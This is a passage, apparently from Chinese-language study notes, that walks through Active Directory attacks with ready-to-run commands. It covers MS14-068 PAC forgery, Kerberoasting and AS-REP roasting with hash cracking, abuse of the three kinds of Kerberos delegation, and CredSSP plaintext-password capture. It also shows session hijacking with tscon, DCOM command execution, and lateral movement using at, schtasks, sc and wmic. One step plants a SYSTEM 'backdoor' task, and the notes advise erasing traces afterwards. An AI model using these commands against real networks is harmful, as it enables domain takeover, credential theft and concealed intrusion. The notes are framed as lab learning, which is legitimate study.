用户主体名称（UPN）和域名系统（DNS）信息。PAC结构不应包含多个这种类型的缓冲区。接收时必须忽略第二个或后续的UPN和DNS信息缓冲区。 0x0000000D 客户索取信息。PAC结构不应包含多个这种类型的缓冲区。附加的客户要求信息缓冲区必须被忽略。 0x0000000E 设备信息。PAC结构不应包含多个这种类型的缓冲区。附加的设备信息缓冲区必须被忽略。 0x0000000F 设备声明信息。PAC结构不应包含多个这种类型的缓冲区。附加的设备声明信息缓冲区必须被忽略。 其中比较重要的是1,6和7 0x00000001 KERBVALIDATIONINFO 这个结构用于存储用户的身份信息.它是一个结构体，这个结构体是这样的(待会我们伪造PAC的时候主要就是伪造此处额 UserId 以及 PGROUP_MEMBERSHIP GroupIds ）服务器解包PAC后提取用户的sid以及groupid，然后就把当前发包过来的用户权限当成sid，groupid的权限处理。 typedef struct _KERB_VALIDATION_INFO &#123;FILETIME LogonTime;FILETIME LogoffTime;FILETIME KickOffTime;FILETIME PasswordLastSet;FILETIME PasswordCanChange;FILETIME PasswordMustChange;RPC_UNICODE_STRING EffectiveName;RPC_UNICODE_STRING FullName;RPC_UNICODE_STRING LogonScript;RPC_UNICODE_STRING ProfilePath;RPC_UNICODE_STRING HomeDirectory;RPC_UNICODE_STRING HomeDirectoryDrive;USHORT LogonCount;USHORT BadPasswordCount;ULONG UserId; &#x2F;&#x2F;用户的sidULONG PrimaryGroupId;ULONG GroupCount;[size_is(GroupCount)] PGROUP_MEMBERSHIP GroupIds;&#x2F;&#x2F;用户所在的组，如果我们可以篡改的这个的话，添加一个500(域管组)，那用户就是域管了。在ms14068 PAC签名被绕过，用户可以自己制作PAC的情况底下，pykek就是靠向这个地方写进域管组，成为使得改用户变成域管ULONG UserFlags;USER_SESSION_KEY UserSessionKey;RPC_UNICODE_STRING LogonServer;RPC_UNICODE_STRING LogonDomainName;PISID LogonDomainId;ULONG Reserved1[2];ULONG UserAccountControl;ULONG SubAuthStatus;FILETIME LastSuccessfulILogon;FILETIME LastFailedILogon;ULONG FailedILogonCount;ULONG Reserved3;ULONG SidCount;[size_is(SidCount)] PKERB_SID_AND_ATTRIBUTES ExtraSids;PISID ResourceGroupDomainSid;ULONG ResourceGroupCount;[size_is(ResourceGroupCount)] PGROUP_MEMBERSHIP ResourceGroupIds;&#125; KERB_VALIDATION_INFO; 0x00000006和0x00000007 6是服务器校验和，由server密码加密。7是KDC校验和，又KDC密码加密。存在的目的就是防止PAC被篡改。 MS14068这个漏洞的产生主要是微软犯下了三个错误：1.对校验和的算法实现不够细致，导致在校验和生成时可以不用管server和KDC的hash直接生成，而且生成出来的校验和还是合法的2.PAC可以不用放在TGT中，即使是这样，KDC也能照常解析出TGT外的PAC3.下面再说 那么这个漏洞大致的攻击原理是什么呢。首先，我们在as_request的时候，把include-PAC标志设置为false，那么as_rep就不会在TGT中返回PAC了。然后这个时候我们自己伪造一个pac，在TGS_REQ时发过去就行了。伪造的pac修改USER SID&amp;GROUP SID(在PAC的 0x00000001 KERBVALIDATIONINFO 结构)可以把我们的用户权限改到很高（域管），从而达到提权到域管的能力。 那么伪造PAC，我们就遇到了两个问题：1.pac里有校验和，防止自己被篡改，我们得有server和KDC密码才能使校验和合法。2.pac按理说应该在TGT里，但是TGT是被kbrtgt hash加密的，我们无法获取kbrtgt hash继而无法修改TGT内容，继而不能修改PAC。 来说说如何绕过PAC校验和问题。我们刚刚说过，0x00000006和0x00000007 这两个结构的存在是为了防止PAC被篡改，这个校验和算法采用的是个叫checksum算法然后把kdc hash和服务hash当作key对PAC加密产生的值，从而防止PAC被篡改。但是checksum算法是有很多种的，md5也是checksum的分支之一，修改PAC后，我们只需设置加密算法为MD5并用MD5算法对0x00000001 KERBVALIDATIONINFO进行加密，将生成的值放入两个检验和即可，KDC拿到0x00000001 KERBVALIDATIONINFO，并且通过解析数据包获取当前加密算法为MD5，然后对其进行MD5加密，若加密结果与校验和一致，则认为PAC未被修改 再来说说如何绕过krbtgt hash加密TGT的问题。因为我们在AS_REQ时设置include-PAC为false，TGT里就不会包含PAC了。那么我们在TGS_REQ时如何把PAC传递给KDC？只需要把PAC放入req-body即可。这样KDC依旧会正常解析这个TGS_REQ包 注意TGS_REQ里的include-pac依旧是false。然后KDC接收到PAC后会先解密TGT拿到authenticator里的key对PAC进行解密（TGS_REQ时加密PAC用的key是随机生成的，这个key会放在authenticator里），然后验证一下PAC的签名，若成功然后把解密得到的PAC采用server key和KDC key重新生成校验和，拼接成一个新的TGT返回给客户端。上面这一段就是微软犯下的第三个错误，很不可思议，居然莫名其妙的返回了一个包含了PAC的TGT回来。总结来说就是构造了一个畸形的TGS_REQ，从TGS_RES得到了一个包含伪造PAC的TGT。 原理就是上面这些，然后我们用包含伪造PAC的TGT到处访问服务即可。 M14068利用1.工具kekeo https://github.com/gentilkiwi/kekeo/releases/tag/2.2.0-20200718 具体方法为，在kekeo里先执行 kerberos::purge清空票据然后再执行 exploit::ms14068 /user:xxx /password:xxx /domain:xxx /ptt即可。 然后就dir \\域控\\c$ 试试，如果可以就说明提权成功了（不是每次都能成功的) 2.golenpac https://github.com/maaaaz/impacket-examples-windows/blob/master/goldenPac.exe 这个工具好用, 执行类似上述命令，就能返回一个域控的 system权限的cmd shell回来，感觉蛮好用另外在最后指定域控机器时，可以指定域控以外的机器并获取他们的本地system权限用户.但返回的似乎不是域控？ kerberoastKerberoast攻击原理: 攻击者从 TGS-REP 中提取加密的服务票证。 由于服务票证是用链接到请求 SPN 的帐户的哈希加密的，所以攻击者可以离线破解这个加密块，恢复帐户的明文密码 How to get SPN如何得到域中的所有SPN？ 1.setspn很简单，只需执行 setspn -q *&#x2F;* 即可 2.kerberoast工具集的GetUserSpns powershell脚本 How to get HASH如何得到hash？有如下方法 1.Rubeus.exe 这个工具github上就有，但是clone下来后需要自己编译成exe. 然后执行 Rubeus.exe kerberoast指令即可 2.mimikatz mimikatz真的神器。通过命令 kerberos::ask /target:你所指定的SPN, 即可通过认证的方式得到一个ST。然后我们在kerberos::list里可以看到我们想要的ST 3.powershell 越来越发现powershell在域渗透中的重要性了输入以下指令，即可完成HASH获取 Add-Type -AssemblyName System.IdentityModelNew-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList &quot;MySQL&#x2F;win7.xie.com:3306&#x2F;MySQL&quot; 然后mimikatz导出即可 How to export hash获得了ST票据，但怎么导出？ 1.mimikatz 导出所有票据 可以发现生成了kirbi文件。这就是我们所需要的hash了 2.Empire Powershell 框架 github:https://github.com/EmpireProject/Empire 我们通过这个框架可以导出hashcat格式的hash. Import-Module .\\Invoke-Kerberoast.ps1;Invoke-Kerberoast -outputFormat Hashcat How to crack HASH如何破解HASH? 1.HASHCAT 这个工具需要让hash格式为hashcat模式才能进行破解。kribi文件不能放入hashcat进行破解. hashcat -m 13110 pass.txt hash.txt 2.kerberoast中的tgsrepcrack.py 支持kribi文件破解 python3 tgsrepcrack.py pass.txt xxx.kribi How to use Kerberoast既然我们都把ST的加密hash都破解了，那么我们就可以随便改ST中的票据内容了..\\ 这里使用的是kerberoast工具集里的kerberoast.py python kerberoast.py -p Password123 -r PENTESTLAB_001.kirbi -w PENTESTLAB.kirbi -u 500python kerberoast.py -p Password123 -r PENTESTLAB_001.kirbi -w PENTESTLAB.kirbi -g 512## 将票据权限改为administratorkerberos::ptt PENTESTLAB.kirbi #将票据注入到内存 AS_REP Roast较Kerberoast来说，比较鸡肋。它的原理是在不开启kerberos预身份验证的前提下，获得其他用户的AS_RES，并破解加密session key 的 client hash。 How to get HASH1.Rubeus Rubeus.exe asreproast 然后就会搜索域中不需要kerberos预验证的用户，并获得ASREP。 2.Empire框架与 ASREPRoast.ps1 使用Empire框架下的powerview.ps1查找域中设置了 “不需要kerberos预身份验证” 的用户 Import-Module .\\powerview.ps1 Get-DomainUser -PreauthNotRequired 然后用 ASREPRoast.ps1 ：https://github.com/HarmJ0y/ASREPRoast 获取指定用户的AS-REPhash Import-Module ASREPRoast.ps1Get-ASREPHash -USER xx -Domain xx |Out-file -Encoding ASCII hash.txt 就会生成一个hash数据文件了 How to crack hash将生成的HASH保存起来，并在下图处加入$23 然后丢给hashcat 跑 hashcat -m 18200 hash.txt pass.txt 注意这里的pass.txt是自己的明文字典…之前我还一直以为是爆破出来的结果.原来是一个一个的用明文字典去爆破。 委派攻击域委派域委派是一种域内主机的行为，使某个服务可以以访问的用户的身份去访问另外一个服务。为什么需要域委派呢，比如现在有web服务器和文件服务器，当用户A访问web服务器去请求某个资源时，web服务器上本身并没有该资源，所以web服务器就会从文件服务器上调用这个资源，其中发生的过程若以域委派的形式进行，那么就是：用户A访问web服务器，服务器再以用户A的身份去访问文件服务器。发生域委派的服务一般为机器账户和服务账户。域委派分为三种：非约束性委派，约束性委派，基于资源的约束性委派 非约束性委派非约束性委派的原理是：用户想访问服务A，于是向KDC提交认证，KDC发现A是非约束性委派，于是会把TGT放在ST中一并给用户。然后用户用这个ST去访问服务A，服务A就相当于获得了用户的TGT，把TGT放入lsass进程，然后就可以拿着用户的TGT以用户的身份去访问所有用户权限能够访问的服务了。 非约束性委派的启用： 为某账户启用 信任此计算机来委派任何服务 即开启非约束性委派。开启后在该用户的 ACL属性会多出一个 flag : WORKSTATION_TRUSTED_FOR_DELEGATION (图截不完，反正这个flag就在箭头所指处的后面) 非约束委派的设置需要SeEnableDelegation 特权，该特权通常仅授予域管理员这里说个题外话，域控主机默认是非约束性委派 约束性委派非约束性委派是很不安全的（因为控制了开启非约束性委派的机器，就相当于获得了上面的所有其他用户的TGT），所以更安全的约束性委派诞生了。约束性委派多了两个委派协议，S4U2SELF S4U2PROXY，并且限制了被设置委派的服务的访问范围：仅能被委派到被指定的服务。 约束性委派的大致流程：用户访问开启约束性委派的服务A（情况一：无S4U2SELF参与）首先需要经过KDC认证，KDC发现服务A开启了约束性委派，于是在TGS_RES返回给用户ST1（可转发ST），用户拿着ST1访问服务A，服务A先与KDC进行身份验证获得一个有效TGT，然后拿着ST1经过S4U2PROXY协议向KDC发起TGS_REQ，KDC返回ST2（用户身份的ST），然后服务A拿着ST2访问指定服务。（情况二：有S4U2SELF参与）用户通过其他方式（如NTLM认证，表单认证等）获取了服务A的信任，但是此时服务A并没有来自用户的ST1，按情况一中的流程，服务A就不能完成委派。所以这个时候服务A会以自己的身份向KDC发起申请获取一个可转发TGT（获取KDC信任），然后用这个TGT发起TGS_REQ获得指定用户的ST1，既然获取了ST1，就继续情况一中的流程即可了。 也就是说S4U2SELF是用户通过非kerberos协议完成认证的情况下，自动向KDC获取ST1的一个协议。而S4U2PROXY则是将ST1发给KDC，使其变现为成自己可用的 ST2 的一个协议。 启用方法: 其中被添加的服务则是允许被委派到的服务 若启用的是 仅使用kerberos，那么useraccountcontrol属性仅有 workstation_trust_account.若启用任何身份验证协议，就会有 TrustedToAuthenticationForDelegation 基于资源的约束性委派Windows Server 2012中引入了基于资源的约束性委派。 只能在运行Windows Server 2012或Windows Server 2012 R2及以上的域控制器上配置基于资源的约束性委派，不需要域管理员前来设置，而把设置委派的权限交给了自身。其实就是可以摆脱域控来主动设置自己可以被哪些账户委派访问。 非约束性委派攻击非约束性委派有巨大的安全问题，上面我们说过，非约束性委派的实质就是把用户的TGT存入lassa进程，从而模拟用户身份进行各种委派访问，所以我们只需控制非约束性委派攻击的机器，然后dump出所有的票据，就相当于获得了所有经过该服务进行约束性委派的用户的身份了。 1.进行非约束性委派账户扫描这里提一下怎么创建有SPN的服务账户。只需再域控里执行 setspn -U -A spn_type username 即可其中spn_type即SPN的格式： MSSQLSvc/:[ | ] MSSQLSvc 是要注册的服务。 是服务器的完全限定域名。 是 TCP 端口号。 是 SQL Server 实例的名称。 这里我们随便输一个，比如 sb/caonima 这种都行. 这里采用powersploit下的powerview.ps1根据我网上很多搜索结果，查找非约束委派服务账户只需调用Get-NetUser -Unconstrained -Domain de1ay.com这个命令即可，但是我下载下来的powerview里的get-netuser里却没有unconstrained参数，很烦。所以用一个比较原始的方法来判别（适合在用户少的情况下）直接调用 Get-NetUser -SPN 找到所有服务账户或者Get-domaincomputer找到所有机器账户，然后判断其useraccountcontrl里有没有trusted_for_delegation,若有，则说明开启了非约束性委派 查询非约束委派机器账户则用Get-domaincomputer -unconstrained -domain const.com 2.非约束性委派的攻击仅能基于机器账户 如果我们获得了一个非约束性委派账户，我们就可以通过收集内存中的tgt达到任意用户访问的目的。 在被控制的非约束性委派机器上使用mimikatz。privilege::debug提权sekurlsa::tickets 查看本机所有票据 通过以上命令获取票据,如果管理员访问了本机的一些服务，那么它的TGT就会被截获放入内存。 我们模拟管理员调用非约束性委派机的smb服务 我们回到非约束委派机，查看票据 tgt被截获,我们用 sekurlas::tickets /export 把票据导出来 然后mimikatz里使用kerberos::ptt 票据文件名 将票据注入内存访问域控c$ 成功 3.非约束性委派配合 Spooler打印机服务纯非约束性委派攻击很鸡肋，因为必须要其他用户通过你进行委派访问。但是 ：利用Windows打印系统远程协议（MS-RPRN）中的一种旧的但是默认启用的方法，在该方法中，域用户可以使用MS-RPRN RpcRemoteFindFirstPrinterChangeNotification（Ex）方法强制任何运行了Spooler服务的计算机以通过Kerberos或NTLM对攻击者选择的目标进行身份验证。 配合非约束性委派攻击，简直爆炸，可以主动拿到其他用户的TGT。-而且splooer服务是默认运行的。（图源WIN7） 使其他主机强行与自己发生身份验证的脚本：需要自己编译一下https://github.com/leechristensen/SpoolSample.git 在此之前需要开启监听来自其他主机的TGT，这里用的是rubeusRubeus.exe monitor /interval:1 /filteruser:xx 然后使用SpoolSample.exe XX win7,让指定机器访问WIN7进行身份验证 然后获得TGT，下班。 约束性委派的攻击约束性委派的大致攻击流程是: (利用S4U2SELF=&gt;)如果我们获得了约束性委派机的NTLM hash或者明文密码，我们就可以以此来向KDC发送一个TGT申请，获得一个可转发的TGT。然后用这个可转发的TGT调用S4U2SELF协议，获得一个针对自己的ST1票据（其中ST1票据中的请求用户可以任意伪造）.然后用这个ST1票据去向KDC请求ST2，然后用ST2去访问服务，此时我们访问的身份就是我们任意伪造的身份了. 重点是只要获得了可转发TGT，约束性委派机就可以任意伪造其他用户的ST1票据请求，太可怕了。 这个攻击的最大前提是我们得获得约束性委派账户的NTLM HASH或者明文密码,然后我们才能成功的得到可转发TGT，然后才能得到接下来的一切。 首先配置好约束性委派账户 注意选用 使用任何身份验证协议 我们先信息搜集：看哪些用户是开启约束性委派的。一手powerview安排上 箭头指出的地方就是可以被委派访问的服务 我们用kekeo来实现攻击. tgt::ask &#x2F;user:xx &#x2F;domain:xx &#x2F;password:xx &#x2F;ticket:test.kirbi这里的&#x2F;password可以改成&#x2F;NTLM:xx获得TGT转发票据tgs::s4u &#x2F;tgt:file_name &#x2F;user:administrator &#x2F;service:cifs&#x2F;DCtgt处改为刚刚得到的TGT文件的名字，这个命令执行后得到administrator身份的 ST2 把最后获得的票据用mimikatz kerberos::ptt 注入内存，完事。 基于资源的约束性委派refer:https://xz.aliyun.com/t/7454 原理的几个点：1.S4U2SELF 协议可以在用户没有配置 TrustedToAuthenticationForDelegation 属性（即开启使用任何协议认证的约束性委派）时被调用，但是返回的ST是不可被转发的。2.基于资源的约束性委派主机 在被另一台主机委派访问时，在S4U2PROXY过程中提交过来的ST如果即使是不可转发的。KDC依旧会返回有效的ST2。3.每个普通域用户默认可以创建至多十个机器账户（ 由MachineAccountQuota属性决定 ），每个机器账户被创建时都会自动注册SPN: RestrictedKrbHost/domain和HOST/domain这两个SPN 攻击流程:假设开启基于资源的约束性委派机器为A1.首先要有一个对当前计算机有写权限的账户，才能对A设置可以 被 委派访问的服务账户。2.利用当前账户创建一个机器账户，并配置好机器账户到A的 基于资源的约束性委派3.因为机器账户是我们创建的，我们知道他的密码账户，可以让它利用S4U2SELF协议获得一个不可转发ST。然后用这个不可转发ST通过S4U2PROXY，在基于资源的约束性委派基础上获得有效的访问A cifs服务的ST2。4.用ST2访问A的CIFS服务，权限获得。 实操这个攻击说白了就是个提权… 首先我们检查一下域控是否是win2012以上的主机，因为只有这样才能开启 基于资源的约束性委派。 我们使用powersploit下的powerview脚本。执行命令 get-netdomaincontroller 可以获得域控WIN版本 然后我们查看当前用户对哪台主机有写权限。因为是实验，所以我们先来看看怎么配置一个用户对一个机器的权限。直接在域控上找到某主机，然后进入在属性里进入安全选项卡，添加某用户，然后给这个用户分配权限即可。 我们依旧使用powerview。先调用Get-DomainUser -Identity username -Properties objectsid来获取当前用户SID然后Get-DomainObjectAcl -Identity 主机名 | ?&#123;$_.SecurityIdentifier -match &quot;刚刚得到的SID&quot;&#125; 查看当前用户对某台主机是否有写权限。 如果有 GenericAll（完全控制权），GenericWrite、WriteProperty、WriteDacl 这些属性，就说明该用户能修改计算机的账户属性。如图看到我们对WIN7进行操作 好的，我们接下来就要创立一个机器用户了。根据网上搜索结果，使用powermad这个ps脚本可以很快捷的创建一个机器用户。https://github.com/Kevin-Robertson/Powermad Import-Module .\\Powermad.ps1New-MachineAccount -MachineAccount hacksystem -Password $(ConvertTo-SecureString &quot;hack&quot; -AsPlainText -Force) 好的，我们添加了一个密码hack，名为hacksystem的机器账户，接下来就是配置hacksystem到WIN7的委派了。我们需要做的，是修改WIN7的 msDS-AllowedToActOnBehalfOfOtherIdentity属性的值 ，这个操作我们用powerview实现。 $SD &#x3D; New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList &quot;O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;S-1-5-21-3298638106-3321833000-1571791979-1112)&quot; #这儿的sid是我们创建的#机器用户#evilsystem的sid$SDBytes &#x3D; New-Object byte[] ($SD.BinaryLength)$SD.GetBinaryForm($SDBytes, 0)Get-DomainComputer WIN7| Set-DomainObject -Set @&#123;&#39;msds-allowedtoactonbehalfofotheridentity&#39;&#x3D;$SDBytes&#125; -Verbose 至于机器账户SID怎么获得，powerview下的 get-domiancomputer hacksystem然后使用Get-DomainComputer WIN7 -Properties msds-allowedtoactonbehalfofotheridentity 查看委派是否设置成功 Set-DomainObject win7 -Clear &#39;msds-allowedtoactonbehalfofotheridentity&#39; -Verbose 此命令可以清除 msds-allowedtoactonbehalfofotheridentity属性的值 现在都统统设置好了，开始下一步吧。网上一般用的rubeus，这里我用kekeo吧 Rubeus.exe hash &#x2F;user:xxx &#x2F;password:xxx &#x2F;domain:xxx 本地运算出机器用户ntlm hash 这里借用一下别人的图 Rubeus.exe s4u /user:evilsystem$ /rc4:B1739F7FC8377E25C77CFA2DFBDC3EC7 /impersonateuser:administrator /msdsspn:cifs/dm2008 /ptt 写入票据 然后我在本机使用以上方法后klist一下，发现确实存在票据 但是dir \\test1\\c$时本机莫名其妙不能进行kerberos验证，我服了》。。但不管怎样，我们拿到银票了 敏感用户不可委派的绕过 若我们的administrator用户被设置为敏感用户不可委派或者被加入保护组，按理说他的访问就不能进行委派。 我们在以administrator账户身份进行S4U时，只能进行S4U2SELF，不能进行S4U2PROXY。我们用 Rubeus.exe s4u /user:evilsystem$ /rc4:B1739F7FC8377E25C77CFA2DFBDC3EC7 /impersonateuser:administrator /msdsspn:cifs/dm2008 /ptt继续实验administrator，发现确实是这样 此时我们用 rubeus.exe describe /ticker:S4Ubase64加密的票据 可以发现servicename并没有指定某个服务，仅仅只有一个账户.即发生了服务名称缺失的问题。很简单，把票据修改一下就行了.网上很多说用这个工具https://www.pkisolutions.com/tools/asn1editor/但实际上rubeus也能完成票据修改rubeus.exe tgssub /ticket:xxx /altservice:cifs/test1 /ptt 完事 credssp 导出用户明文密码CredSSP协议的目的是将用户的明文密码从CredSSP客户端委派给CredSSP服务器。 通常运用于远程桌面服务。 我们在配置这个协议时，一般在组策略编辑器里配置。 Allow delegating default credentials表示在通过使用受信任的X509证书或Kerberos实现服务器身份验证时自动发送当前用户的凭据，即明文密码。 Allow delegating default credentials with NTLM-only server authentication表示在通过NTLM实现服务器身份验证时自动发送当前用户的凭据，即明文密码。 这几个属性在注册表里对应 HKEY_LOCAL_MACHINE\\SOFTWARE\\Policies\\Microsoft\\Windows\\CredentialsDelegation。 攻击原理那么这样看，这个攻击流程就很自然了。我们要获得两台机器，一台机器当作远程桌面的服务器，一台当作远程桌面的客户端。在客户端上配置组策略（CREDSSP），使其在远程桌面身份验证时发送明文密码。然后开始远程桌面验证，在服务器上获得客户端发来的明文密码. 实操1.通过修改注册表，改变组策略身份验证的凭据策略(选一个），这一步需要管理员权限，本地或域管 reg add hklm\\SOFTWARE\\Policies\\Microsoft\\Windows\\CredentialsDelegation &#x2F;v AllowDefaultCredentials &#x2F;t REG_DWORD &#x2F;d 1reg add hklm\\SOFTWARE\\Policies\\Microsoft\\Windows\\CredentialsDelegation &#x2F;v AllowDefCredentialsWhenNTLMOnly &#x2F;t REG_DWORD &#x2F;d 1reg add hklm\\SOFTWARE\\Policies\\Microsoft\\Windows\\CredentialsDelegation &#x2F;v ConcatenateDefaults_AllowDefault &#x2F;t REG_DWORD &#x2F;d 1reg add hklm\\SOFTWARE\\Policies\\Microsoft\\Windows\\CredentialsDelegation &#x2F;v ConcatenateDefaults_AllowDefNTLMOnly &#x2F;t REG_DWORD &#x2F;d 1reg add hklm\\SOFTWARE\\Policies\\Microsoft\\Windows\\CredentialsDelegation\\AllowDefaultCredentials &#x2F;v 1 &#x2F;t REG_SZ &#x2F;d *reg add hklm\\SOFTWARE\\Policies\\Microsoft\\Windows\\CredentialsDelegation\\AllowDefCredentialsWhenNTLMOnly &#x2F;v 1 &#x2F;t REG_SZ &#x2F;d * 一股脑设置好就完事了。。（用户需重新登陆才生效） 然后开始获取密码 我们刚刚提到需要两台电脑才能获取密码，其实那只是一个模型，一个机器既可以当作客户端又可以当作服务端的。我们用kekeo实现攻击（本机向本机获取密码时，普通用户即可完成以下操作） tsssp::server 开启服务端tsssp::client &#x2F;target:... 开启客户端，这里的target随便填 那么再回到需要两个机器，一个当服务端一个当客户端的情况吧。 服务端建立: tsssp::server 需要SYSTEM权限 客户端链接: tsssp::client /target:服务端的SPN（一般采用TERMSRV服务） /pipe: \\服务端域名\\pipe\\kekeo_tsssp_endpoint 普通用户权限即可 tscon横向若一个机器上有多个用户登录，则在任务管理器可以看见如下场面 其中，我们可以右键其他用户选择链接，输入其密码后就能进入其桌面 但是对于system用户来说，要链接到其他用户是不需要输入密码的，可以直接连接。所以我们可以通过system权限获取登录在当前机器上的域用户权限。比如上图中的administrator是域管，我有当前机器的system权限，那么我可以直接用以下命令完成用户权限获得。 query user 获得administrator用户的id 可以发现admin的id是2，那么我们就可以用tscon这个windows自带的命令行工具完成权限获得。 cmd /k tscon 2 /dest:console 执行以上命令，我们跳转到了admin的桌面 利用COM/DCOM对象参考:https://www.freebuf.com/articles/network/256372.html 前言DCOM是COM的扩展，允许应用程序实例化和访问远程计算机上的COM对象。这里简要说一下几个有关COM的概念 CLSID：又叫CLASSID 一个COM类的唯一标识符，每一个Windows注册类与一个CLSID相关联。长得像这样 {20D04FE0-3AEA-1069-A2D8-08002B30309D} ProgID：其可被用作对用户更友好的替代的一个CLSID，比如MMC20.APPLICATION.1就是一个ProgID。ProgID不能保证是唯一的，并非每个类都与ProgID相关联 Appid: 为了保证COM对象能被顺利的远程调用（即为了使DCOM可访问COM对象），需要把APPID与该类的CLSID相关联，且AppID需设置权限来规划哪些客户端能够访问 我们可以通过powershell执行get-CimInstance 来列出本地COM程序列表 远程DCOM对象实例化的流程: 客户端从远程计算机请求实例化由CLSID表示的对象。如果客户端使用ProgID则先将其本地解析为CLSID。远程计算机检查是否存在由该CLSID所关联的AppID，并验证客户端的权限。DCOMLaunch服务将创建所请求的类的实例，通常是通过运行LocalServer32子项的可执行文件，或者通过创建DllHost进程来承载InProcServer32子项引用的dll。客户端应用程序和服务器进程间建立通信，客户端便可以访问新创建的对象。 MMC20.APPLICATION.1中文名为： Microsoft管理控制台（MMC）2.0包括脚本对象模型。 我们一步步抽丝剥茧跟踪一下这个对象的利用点，需要注意的一点是调用该对象必须要有管理员权限。 如上图，我们先列出在MMC20.APPLICATION中的模块，然后继续列出其中Document中的属性，再继续列出Document.ActiveView中的属性。可以发现一个名为ExecuteShellCommand的方法，光是听名字就知道是可以执行shell命令的方法了。到微软文档查一查这个方法，获得了以下信息。 ExecuteShellCommand（[命令][目录][叁数][窗口状态]）命令一个值，指定要执行的命令。可以指定标准路径。Command中包含的所有环境变量（例如“％windir％”）都将被扩展。目录一个值，用于指定工作目录的名称。Directory中包含的所有环境变量都将被扩展。如果“目录”为空字符串，则将当前目录用作工作目录。参数一个指定Command要使用的参数（如果有）的值；参数必须用空格分隔。例如，将参数指定为“ Param1 Param2”会导致Command接收Param1和Param2作为参数。如果要求单个参数用双引号引起来，请使用适合您的编程语言的技术。例如，在Microsoft Visual Basic中，将参数指定为“ Param1”“这是Param2”“”导致命令接收到参数1和“这是Param2”。窗口状态一个指定窗口状态的值。该值可以是以下字符串值之一，也可以是空字符串。如果为空字符串，则默认为“已恢复”。“Maximized”该命令在最大化的窗口中执行。“Minimized”该命令在最小化的窗口中执行。“Restored”该命令在已恢复或正常的窗口中执行。注意：这里会弹个黑框框返回值此方法不返回值。 于是乎，我们就能理所应当的想到这个东西可以被用于本地任意命令执行，就像这样 [activator]::CreateInstance([type]::GetTypeFromProgID(&quot;MMC20.application&quot;)).Document.ActiveView.Executeshellcommand(&#39;cmd.exe&#39;,$null,&quot;&#x2F;c calc.exe&quot;,&quot;Restored&quot;) 我们进一步发掘其横向移动的能力 我们知道DCOM具有通过网络与对象进行交互的能力，在我们是管理员的前提下我们可以使用GetTypeFromProgID()与powershell进行DCOM远程交互。GetTypeFromProgID(“COM”,”远程ip”) 即可指定与哪一个远程IP进行交互。所以我们可以把payload改造成这样，进而可以在其他机器上进行任意命令执行，从而达到横向移动的目的 [activator]::CreateInstance([type]::GetTypeFromProgID(&quot;MMC20.application&quot; ，“远程ip”)).Document.ActiveView.Executeshellcommand(&#39;cmd.exe&#39;,$null,&quot;&#x2F;c calc.exe&quot;,&quot;Restored&quot;) ipcipc简介IPC$是为了让进程间通信而开放的命名管道，通过提供可信任的用户名和口令，即能建立链接，达到访问远程计算机的目的。利用这个链接不仅可以访问目标机器中的文件，进行上传下载等操作，还能在目标机器上执行部分命令。 net use \\\\ip\\ipc$ &quot;password&quot; &#x2F;user:username 如果账户和口令正确，就建立好了链接。 建立好链接后就能执行以下命令 dir \\\\192.168.183.130\\c$ 列出C盘copy C:\\Users\\douser\\Desktop\\whoami.txt \\\\192.168.183.130\\c$ 上传文件tasklist &#x2F;S 192.168.183.130 &#x2F;U administrator &#x2F;P liu78963 列出某IP上的进程信息，&#x2F;U指定哪个用户执行该命令，&#x2F;p指定该用户密码net use \\\\IP &#x2F;del &#x2F;y 删除链接net use 查看已建立的ipc链接 利用ipc横向移动atat \\\\192.168.183.130 17:05:00 cmd.exe &#x2F;c &quot;&lt;命令&gt;&quot;at \\\\192.168.183.130 17:05:00 powershell.exe -c &quot;&lt;命令&gt;&quot; 关于时间的获得，可以使用 net time \\\\IP 获得。 计划任务执行后需要删除，不留痕迹 at \\\\192.168.183.130 1 &#x2F;delete &#x2F;&#x2F;1为任务的ID 关于此方法我们可以先通过copy上传恶意文件然后通过at来执行它，或者直接通过powershell远程加载上线等 schtasksat命令已经被Windows Vista、Windows Server 2008及之后版本的操作系统废弃了，取而代之的是schtasks命令。 横向移动的大致思路与at差不多。 在目标主机上创建一个名称为“backdoor”的计划任务。该计划任务每分钟启动一次，启动程序为我们之前到C盘下的shell.exe，启动权限为system。schtasks &#x2F;create &#x2F;s 192.168.183.130 &#x2F;tn backdoor &#x2F;sc minute &#x2F;mo 1 &#x2F;tr c:\\shell.exe &#x2F;ru system &#x2F;f 但也有些时候，由于当前权限或组策略设置等原因，该schtasks方法远程创建计划任务可能会报错拒绝访问,遇到这种情况，我们可以加上&#x2F;u和&#x2F;p参数分别设置高权限用户名和密码 schtasks &#x2F;create &#x2F;s 192.168.183.130 &#x2F;u username &#x2F;p password &#x2F;tn backdoor &#x2F;sc minute &#x2F;mo 1 &#x2F;tr c:\\shell.exe &#x2F;ru system &#x2F;f另外，在我们创建好计划任务后，可以通过下列指令立即让计划任务执行（如果拒绝访问的话就加上&#x2F;u &#x2F;p参数）schtasks &#x2F;run &#x2F;s 192.168.183.130 &#x2F;i &#x2F;tn backdoor &#x2F;&#x2F; i：忽略任何限制立即运行任务计划任务执行后需要清理痕迹schtasks &#x2F;delete &#x2F;s 192.168.183.130 &#x2F;tn &quot;backdoor&quot; &#x2F;f sc这个命令可以操控服务。 sc \\\\[主机名&#x2F;IP] create [servicename] binpath&#x3D; &quot;[path]&quot; #创建服务，其中binpath可以是某个exe文件的路径，也可以是一段指令。当为路径时，服务启动时会自动执行该exe文件，当为指令时，服务启动时会自动执行该指令sc \\\\[host] start [servicename] 启动某个服务sc \\\\[host] delete [servicename] #删除服务 wmi从Windows 98开始，Windows操作系统都支持WMI。WMI是由一系列工具集组成的，可以通过/node选项使用端口135上的远程过程调用(RPC)进行通信以进行远程访问，它允许系统管理员远程执行自动化管理任务，例如远程启动服务或执行命令。并且wimc执行命令时不会留下日志信息。 通过wmic在远程主机上开启进程 wmic &#x2F;node:192.168.183.130 &#x2F;user:administrator &#x2F;password:Liu78963 process call create &quot;command&quot; wmiexec通过wmic创建远程进程时，不会有回显，需要通过ipc$链接type，重定向等手段才能看到回显结果，就很不方便，wmicexec的出现就很好的解决了这一痛点。具体原理是通过wmic在135端口进行交互，再把内容通过445端口传回来。 wmiexec普遍来说有三种版本.py，exe，.vbs。可以走socks5协议代入内网，杜绝了bypassav的麻烦。(exe版本网上似乎很不好找) 这里用python版本，下载链接https://github.com/SecureAuthCorp/impacket/releases/tag/impacket_0_9_22， 